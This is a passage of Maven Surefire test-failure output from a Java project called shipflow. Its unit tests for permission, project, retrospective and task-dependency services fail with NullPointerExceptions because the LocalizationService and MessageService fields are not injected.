	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   PermissionServiceTest.createPermission_WhenAlreadyExists_ShouldThrowException:371 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.createPermission(PermissionService.java:198)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$createPermission_WhenAlreadyExists_ShouldThrowException$5(PermissionServiceTest.java:368)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   PermissionServiceTest.createPermission_WhenExists_ShouldThrowException:296 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.createPermission(PermissionService.java:198)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$createPermission_WhenExists_ShouldThrowException$2(PermissionServiceTest.java:293)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   PermissionServiceTest.deletePermission_WithInvalidId_ShouldThrowException:384 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.deletePermission(PermissionService.java:241)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$deletePermission_WithInvalidId_ShouldThrowException$6(PermissionServiceTest.java:383)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   PermissionServiceTest.updatePermission_WithInvalidId_ShouldThrowException:354 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null"
to contain:
  "Permission not found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.lambda$1(PermissionService.java:224)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.updatePermission(PermissionService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$updatePermission_WithInvalidId_ShouldThrowException$4(PermissionServiceTest.java:352)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.updatePermission_WithInvalidId_ShouldThrowException(PermissionServiceTest.java:352)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   ProjectServiceTest.create_WithDuplicateKey_ShouldThrowException:157 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.ProjectService.create(ProjectService.java:58)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.lambda$create_WithDuplicateKey_ShouldThrowException$1(ProjectServiceTest.java:156)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   ProjectServiceTest.delete_WhenHasCycles_ShouldThrowException:212 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.ProjectService.delete(ProjectService.java:136)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.lambda$delete_WhenHasCycles_ShouldThrowException$2(ProjectServiceTest.java:211)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$ErrorHandlingTests.cannotOpenClosedRetro:369 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.openRetro(RetroService.java:133)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.lambda$cannotOpenClosedRetro$3(RetroServiceTest.java:368)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$ErrorHandlingTests.cannotUpdateClosedRetro:357 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.updateRetro(RetroService.java:110)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$ErrorHandlingTests.lambda$cannotUpdateClosedRetro$2(RetroServiceTest.java:356)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$RetroItemTests.cannotDeleteItemFromClosedRetro:437 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.deleteRetroItem(RetroService.java:233)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.lambda$cannotDeleteItemFromClosedRetro$1(RetroServiceTest.java:436)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$RetroItemTests.cannotUpdateItemInClosedRetro:412 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.updateRetroItem(RetroService.java:215)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroItemTests.lambda$cannotUpdateItemInClosedRetro$0(RetroServiceTest.java:411)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$RetroLifecycleTests.cannotAddItemsToClosedRetro:234 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.createRetroItem(RetroService.java:187)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$RetroLifecycleTests.lambda$cannotAddItemsToClosedRetro$1(RetroServiceTest.java:233)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(83 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   RetroServiceTest$TeamSettingTests.retroOperationsBlockedWhenDisabled:149 
Expecting actual throwable to be an instance of:
  java.lang.IllegalStateException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.validateRetrospectivesEnabled(RetroService.java:429)
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.getAllRetrosByProject(RetroService.java:34)
	at com.github.farzadsedaghatbin.shipflow.service.RetroServiceTest$TeamSettingTests.lambda$retroOperationsBlockedWhenDisabled$0(RetroServiceTest.java:148)
	...(84 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.addDependency_CircularDependency_ThrowsException:233 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:61)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_CircularDependency_ThrowsException$5(TaskDependencyServiceTest.java:232)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.addDependency_ComplexCircularDependency_ThrowsException:402 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:61)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_ComplexCircularDependency_ThrowsException$8(TaskDependencyServiceTest.java:401)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.addDependency_DuplicateDependency_ThrowsException:205 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:56)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_DuplicateDependency_ThrowsException$4(TaskDependencyServiceTest.java:204)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.addDependency_SelfDependency_ThrowsException:186 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:51)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_SelfDependency_ThrowsException$3(TaskDependencyServiceTest.java:185)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.addDependency_TasksInDifferentCycles_ThrowsException:170 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:46)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_TasksInDifferentCycles_ThrowsException$2(TaskDependencyServiceTest.java:169)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.getDependenciesForTask_TaskNotFound_ThrowsException:323 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.getDependenciesForTask(TaskDependencyService.java:90)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$getDependenciesForTask_TaskNotFound_ThrowsException$7(TaskDependencyServiceTest.java:322)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskDependencyServiceTest.removeDependency_NotFound_ThrowsException:276 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.removeDependency(TaskDependencyService.java:80)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$removeDependency_NotFound_ThrowsException$6(TaskDependencyServiceTest.java:275)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskHierarchyServiceTest.shouldFailToCreateTaskWithParentFromDifferentCycle:169 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.createTask(TaskService.java:139)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldFailToCreateTaskWithParentFromDifferentCycle$1(TaskHierarchyServiceTest.java:168)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskHierarchyServiceTest.shouldPreventCircularReferenceWhenUpdating:324 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldPreventCircularReferenceWhenUpdating$2(TaskHierarchyServiceTest.java:323)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskHierarchyServiceTest.shouldPreventTaskFromBeingItsOwnParent:337 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.TaskHierarchyServiceTest.lambda$shouldPreventTaskFromBeingItsOwnParent$3(TaskHierarchyServiceTest.java:336)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   TaskServiceTest.deleteTask_WhenNotExists_ShouldThrowException:248 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "Task not found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.deleteTask(TaskService.java:374)
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.lambda$deleteTask_WhenNotExists_ShouldThrowException$3(TaskServiceTest.java:246)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.deleteTask_WhenNotExists_ShouldThrowException(TaskServiceTest.java:246)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
